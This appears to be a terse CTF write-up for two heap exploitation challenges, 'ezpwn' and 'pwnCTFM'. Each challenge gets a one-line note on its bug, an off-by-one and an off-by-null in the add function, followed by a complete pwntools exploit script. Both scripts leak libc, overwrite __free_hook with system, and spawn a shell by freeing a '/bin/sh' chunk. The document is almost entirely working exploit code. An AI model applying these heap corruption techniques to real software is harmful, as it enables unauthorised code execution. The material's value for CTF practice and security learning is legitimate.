# ezpwn

add存在一个`off by one`



exp:

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch='amd64', endian='el', os='linux')
context.log_level = 'debug'
if debug == 1:
    p = process(['./chall'])
else:
    p = remote('', )
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./chall', checksec=False)
libc_one = [0x4f3d5, 0x4f432, 0x10a41c, 0x4f365, 0x4f3c2, 0x10a45c, 0x4f2c5, 0x4f322, 0x10a38c]

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./chall",checksec=False)

def cmd(cho):
    sla(">>",str(cho))
def add(num,name,size,content):
    cmd(1)
    sla(":",str(num))
    sla(":",name)
    sla("size:",str(size))
    sleep(0.02)
    sa("info:",content)
def free(idx):
    cmd(2)
    sla("index:",str(idx))
def show(idx):
    cmd(3)
    sla("index:",str(idx))
def edit(idx,num,name,content):
    cmd(4)
    sla("index:",str(idx))
    sla(":",str(num))
    sleep(0.02)
    sla(":",name)
    sa("info:",content)

add(111,'nit',0x80,'a\n')
add(111,'nit',0x68,'\n')
free(0)
add(11,'nit',0x8,'aaaaaaaaa')
show(2)
libc.address = u64(p.recvuntil("\x7f")[-6:].ljust(8,'\x00')) -0x3c4b61
free_hook = libc.address + 0x3c67a8
# malloc_hook = libc.sym['__malloc_hook']
one = [0x45226,0x4527a,0xf03a4,0xf1247]
og = libc.address + one[0]
sys_addr = libc.address + 0x453a0
leak("libc.address",libc.address)
leak("free_hook",free_hook)

edit(1,111,'aaaaaaaa'+'aaaaa'+p64(free_hook),p64(sys_addr) + '\n')
edit(2,111,'/bin/sh\x00','/bin/sh\x00\n')
free(2)
gdb.attach(p)
ti()
```



# pwnCTFM

add处off by null

exp

```
#!usr/bin/env python 
# -*- coding: utf-8 -*-
from pwn import  *
from easyLibc import *
from ctypes import cdll

context(arch='amd64',endian='el',os='linux')
context.log_level = 'debug'
debug = 1
if debug == 1:
	p = process("./chall")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
else:
	p = remote()
	libc = ELF("./libc.so.6",checksec=False)
call_libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./chall",checksec=False)

sla("name:","CTFM")
sla(":",'123456')
def cmd(cho):
	sla(">>",str(cho))
def add(name,size,content,score):
	cmd(1)
	sla(":",name)
	sla(":",str(size))
	sa(":",content)
	sla(":",str(score))
def free(idx):
	cmd(2)
	sla(":",str(idx))
def show(idx):
	cmd(3)
	sla(":",str(idx))

add('aaa',0xf8,'aaa',114514)
for _ in xrange(7):
 add('aaa',0xf8,'aaa',114514)
add('aaa',0xf8,'aaa',114514)
add('aaa',0x20,'aaa',114514)
for i in xrange(6):
 free(7)
 add('aaa',0xf8,'a'*(0xf8-i),114514)
free(7)
add('aaa',0xf8,'a'*0xf1 + '\x08',114514)
free(7)
add('aaa',0xf8,'a'*0xf0,114514)
for i in xrange(1,8):
 free(i)
free(0)
free(9)
free(8)
for i in xrange(8):
 add('aaa',0xf8,'/bin/sh\x00',114514)
show(6)
p.recvuntil('des:')
leak_libc = u64(p.recv(6) + '\x00\x00') - 4111520
log.info('leak libc ' + hex(leak_libc))
free(7)
free(5)
add('aaa',0x118,'a' * 0x100 + p64(
leak_libc+libc.symbols['__free_hook']),114514)
add('aaa',0xf8,p64( leak_libc+libc.symbols['system']),114514)
add('aaa',0xf8,p64( leak_libc+libc.symbols['system']),114514)
free(0)
ti()
```



